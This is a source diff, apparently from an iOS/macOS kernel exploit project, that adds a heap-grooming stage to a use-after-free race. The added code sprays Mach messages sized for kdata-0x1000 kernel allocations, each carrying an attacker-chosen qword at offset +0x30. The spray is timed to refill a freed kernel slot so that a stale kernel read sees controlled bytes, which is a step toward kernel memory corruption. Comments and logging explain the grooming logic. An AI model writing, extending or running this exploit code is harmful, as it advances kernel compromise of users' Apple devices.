@@ -107,7 +107,8 @@ static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMS
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v3.4-decodeerr"
+#define P110_BUILD      @"p110-swapclaim-v3.6-fgroom"
+#define P110_GROOM_KDATA 0x1000        /* the groom kmsg's kdata size       */
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
 #define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
@@ -243,6 +244,26 @@ static const char *const g_p110_arms[6] = {
 static int  g_p110_arm;                       /* one arm per tap             */
 static int  g_p110_armPreset = -1;            /* the row-preset arm
                                                  (consume-once; -1 = none)   */
+
+/* ---- v3.6 FGROOM (chain 1, knob-gated): the +0x30 AIM --------------------
+   The Family-B conversion. Outcome (c) proved the reclaim re-hands the
+   VICTIM's own slot (pop[0] == victim sid); outcome (b) proved the stale
+   consumer DEREFERENCES the freed slot in-window. The missing piece is
+   filling that freed slot with bytes WE choose so the stale read sees a
+   controlled field instead of faulting. Knob: Documents/p110_groom.txt =
+   "hexqword[,count]" (e.g. cafe0fedcafe0fed,48). When present, the reclaim
+   racer fires COUNT kdata-4096-class live kmsgs in-window BEFORE the +2
+   pop, payload qword at kdata+0x30 = the chosen value (kernel mach_msg
+   header = 0x30; the first body qword lands at +0x30 of the occupying
+   allocation). Success class = outcome (c) on groomed rounds — the +0x30
+   observable then carries OUR bytes. Honesty: a groomed slot read is still
+   proxy-class until a kread pairs; the (b) fault class stays possible.
+   Default: knob ABSENT = OFF (the race shape is byte-identical v3.4).   */
+static BOOL     g_p110_groom   = NO;
+static uint64_t g_p110_groom_q = 0;
+static int      g_p110_groom_n = 48;
+static mach_port_t g_p110_groom_port = MACH_PORT_NULL;
+static atomic_int g_p110_groom_fired;
 static int  g_p110_prefillN = P110_PREFILL_DEF;
 static BOOL g_p110_dialBase0;                 /* arms 0/3: the dial stays 0  */
 static BOOL g_p110_popEarly;                  /* arm 3: +2 pop pre-window    */
@@ -429,6 +450,39 @@ static void *p110_t_destroy(void *arg) {
     return NULL;
 }
 
+/* ---- v3.6 FGROOM fire: the in-window kdata-4096-class kmsg spray --------
+   One receive-right port held for the tap (never read = the kmsgs stay
+   queued/live). Each fire sends COUNT messages whose payload qword at
+   buffer+0x30 = the chosen value; kernel-side the mach copy yields a
+   kdata ≈ 0x1000 allocation whose body qword sits at +0x30 (msgh 0xFDC →
+   kdata 0x1000, the P034 delta law +0x24). The allocations race the +2
+   pop for the freed zalloc slot: if OUR kmsg takes the victim's slot,
+   the stale consumer's +0x30 read sees the chosen qword.              */
+static void p110_groom_fire(int n) {
+    if (!g_p110_groom || n <= 0) return;
+    if (g_p110_groom_port == MACH_PORT_NULL) {
+        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
+                               &g_p110_groom_port) != KERN_SUCCESS) return;
+    }
+    static uint8_t buf[P110_GROOM_KDATA];
+    mach_msg_header_t *h = (mach_msg_header_t *)buf;
+    memset(buf, 0, sizeof buf);
+    /* msgh_size 0xFDC -> kdata 0x1000 (the +0x24 kmsg-copy law, P034 class) */
+    h->msgh_size        = P110_GROOM_KDATA - 0x24;
+    h->msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND_ONCE, 0);
+    h->msgh_remote_port = g_p110_groom_port;
+    h->msgh_local_port  = MACH_PORT_NULL;
+    h->msgh_id          = 0x4C31;             /* 'L1' marker id             */
+    *(uint64_t *)(buf + 0x30) = g_p110_groom_q;   /* body qword @ +0x30    */
+    for (int i = 0; i < n; i++) {
+        kern_return_t kr = mach_msg(h, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                    h->msgh_size, 0, MACH_PORT_NULL,
+                                    8, MACH_PORT_NULL);
+        if (kr == KERN_SUCCESS) atomic_fetch_add(&g_p110_groom_fired, 1);
+        else break;                            /* bounded, no retry storm   */
+    }
+}
+
 static void *p110_t_reclaim(void *arg) {
     (void)arg;
     p110_pin();
@@ -443,6 +497,13 @@ static void *p110_t_reclaim(void *arg) {
            and the +2 pop — the 267 v10 one-slot calibration law           */
         long d = g_dial;
         for (volatile long i = 0; i < d; i++) { }
+        /* v3.6 FGROOM: the chosen-bytes reclaim competition. Fires BEFORE
+           the +2 pop so the kmsg allocations also race the freed slot —
+           if ours takes the victim slot, the stale consumer's +0x30 read
+           lands on the chosen qword instead of faulting (the (b)-to-(c)
+           conversion the chain exists to take). Knob-gated; absent knob =
+           byte-identical v3.4 behavior.                                */
+        if (g_p110_groom) p110_groom_fire(g_p110_groom_n);
         /* bandit arm 3 (popearly): the +2 fresh creates were ALREADY issued
            pre-window by the tap thread — this thread returns idle so the
            window shape (engine/destroy releases) is unchanged             */
@@ -1036,6 +1097,42 @@ static NSString *p110_flags_law(void) {
            g_p110_dialBase0 ? "pinned-0ns" : "+200ns-bump-law",
            g_p110_popEarly ? "EARLY-pre-window" : "in-window",
            g_p110_leakStage ? "ON (sel-8 leak stage + pairing)" : "OFF (pure v1.2)");
+
+        /* v3.6 FGROOM knob: Documents/p110_groom.txt = "hexqword[,count]".
+           Consumed ABSENT-only (the file stays — the tap reads it every
+           run; the value is a knob, not a one-shot). ABSENT = OFF and the
+           race shape is byte-identical v3.4.                           */
+        {
+            NSString *docs = [NSSearchPathForDirectoriesInDomains(
+                NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+            NSString *s = [NSString stringWithContentsOfFile:
+                [docs stringByAppendingPathComponent:@"p110_groom.txt"]
+                encoding:NSUTF8StringEncoding error:nil];
+            if (s) {
+                NSString *t = [s stringByTrimmingCharactersInSet:
+                    [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+                NSArray *parts = [t componentsSeparatedByString:@","];
+                uint64_t q = strtoull([parts[0] UTF8String], NULL, 16);
+                if (q) {
+                    g_p110_groom   = YES;
+                    g_p110_groom_q = q;
+                    if (parts.count > 1) {
+                        long n = strtol([parts[1] UTF8String], NULL, 10);
+                        if (n > 0 && n <= 256) g_p110_groom_n = (int)n;
+                    }
+                    Lf(@"[fgroom] ARMED qword=0x%016llx count=%d "
+                       @"(p110_groom.txt; chain 1 — the reclaim fires "
+                       @"kdata-0x1000 kmsgs, chosen qword @ +0x30, in-window "
+                       @"before the pop; the (b)-to-(c) conversion)",
+                       g_p110_groom_q, g_p110_groom_n);
+                } else {
+                    Lf(@"[fgroom] present but qword=0 — OFF (honest)");
+                }
+            } else {
+                Lf(@"[fgroom] OFF (p110_groom.txt absent — race shape is "
+                   @"byte-identical v3.4)");
+            }
+        }
     }
 
     /* ---- v2 LEAK STAGE validation capture (leakgate-on arm only) ----
@@ -1246,6 +1343,15 @@ static NSString *p110_flags_law(void) {
          : (g_d_probe_alive > 0) ? @"RESOLVABLE after owner release"
                                  : @"n/a (no prior victim this round)",
            g_pop_sid[0], g_pop_sid[1]);
+
+        /* v3.6 FGROOM round row: what the reclaim window actually did. */
+        if (g_p110_groom) {
+            Lf(@"[fgroom r%d] fired=%d/%d qword=0x%016llx — if a groom kmsg "
+               @"took the freed slot, the stale +0x30 read saw OUR qword "
+               @"(conversion receipt = (c)-anomaly ON groomed rounds)",
+               r, atomic_load(&g_p110_groom_fired), g_p110_groom_n,
+               g_p110_groom_q);
+        }
 
         /* ---- post-round evidence pass (design §4 per-round print law) ---- */
         NSString *evidence = nil;
